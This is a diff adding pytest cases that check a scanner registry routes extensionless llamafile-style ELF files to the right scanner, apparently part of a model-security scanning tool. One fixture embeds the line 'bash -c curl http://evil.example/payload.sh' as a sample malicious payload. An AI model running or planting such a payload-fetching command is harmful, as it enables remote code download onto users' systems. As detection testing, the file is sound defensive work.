@@ -576,6 +576,32 @@ def test_get_scanner_for_path_routes_extensionless_readme_to_metadata_scanner(tm
     _assert_scanner_for_path(readme_path, "metadata")
 
 
+def test_get_scanner_for_path_routes_extensionless_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "llama"
+    llamafile_path.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "llama"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
+
+
 @pytest.mark.parametrize("filename", ["README.md.bak", "model_card.tmp"])
 def test_get_scanner_for_path_does_not_route_metadata_near_match_suffixes(
     tmp_path: Path,
